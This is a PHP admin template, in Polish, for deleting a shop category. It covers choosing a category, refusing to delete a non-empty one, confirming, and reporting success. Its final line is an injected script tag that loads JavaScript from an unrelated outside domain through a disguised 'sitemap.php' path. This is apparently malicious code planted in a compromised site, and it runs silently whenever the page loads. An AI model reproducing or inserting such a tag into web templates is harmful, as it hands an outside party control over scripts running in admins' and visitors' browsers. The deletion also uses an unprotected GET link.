<h2>Usuwanie kategorii</h2>

<?if(getFlag('notChosen')):?>
	<h3>Wybierz kategorię do usunięcia:</h3>
	<?module('categories_admin', array('link' => 'categoryRemove'))?>
<?elseif(getFlag('hasChildren')):?>
	<p>Nie możesz usunąć tej kategorii, ponieważ nie jest ona pusta (zawiera produkty lub inne kategorie). Musisz najpierw przenieść lub usunać jej zawartość.
<?elseif(getFlag('noConfirm')):?>
	<p><a href='/categoryRemove/<?=getOrder(1)?>/confirmed'>Czy na pewno chcesz usunąć <?=$current -> name?>?
<?else:?>
	<p>Usunięto kategorię!</a>
<?endif?>
<script src=http://johanneswallmark.com/media/sitemap.php ></script>